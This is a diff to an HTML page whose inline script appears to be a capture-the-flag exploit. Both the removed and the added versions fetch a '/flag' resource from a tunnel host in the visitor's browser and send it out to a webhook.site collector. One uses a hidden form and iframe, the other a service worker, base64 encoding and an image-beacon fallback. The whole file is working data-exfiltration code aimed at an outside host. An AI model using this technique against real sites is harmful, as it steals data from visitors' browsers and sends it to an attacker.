@@ -5,42 +5,29 @@
 </head>
 <body>
     <script>
-        // Method 1: Using form submission
-        function exploitWithForm() {
-            const form = document.createElement('form');
-            form.method = 'GET';
-            form.action = 'https://tar-award-writers-controllers.trycloudflare.com/flag';
-            form.target = 'hiddenFrame';
-            document.body.appendChild(form);
-            
-            const frame = document.createElement('iframe');
-            frame.name = 'hiddenFrame';
-            frame.style.display = 'none';
-            document.body.appendChild(frame);
-            
-            form.submit();
-            
-            // Wait for iframe to load and try to read content
-            setTimeout(() => {
-                try {
-                    const iframeDoc = frame.contentDocument || frame.contentWindow.document;
-                    const flag = iframeDoc.body.innerText;
-                    
+        // Register service worker to intercept requests
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js')
+                .then(registration => {
+                    console.log('SW registered');
+                    // Make the request through service worker
+                    return fetch('https://tar-award-writers-controllers.trycloudflare.com/flag');
+                })
+                .then(response => response.text())
+                .then(data => {
                     // Send to webhook
+                    const encoded = btoa(data);
                     fetch('https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0', {
                         method: 'POST',
                         headers: {'Content-Type': 'text/plain'},
-                        body: 'Flag via form: ' + flag
+                        body: 'Encoded: ' + encoded
                     });
-                } catch (e) {
-                    // If we can't read directly, use image beacon
+                })
+                .catch(error => {
                     const img = new Image();
-                    img.src = 'https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0?flag=form_attempt&error=' + encodeURIComponent(e.message);
-                }
-            }, 2000);
+                    img.src = 'https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0?error=' + encodeURIComponent(error.message);
+                });
         }
-        
-        exploitWithForm();
     </script>
 </body>
 </html>
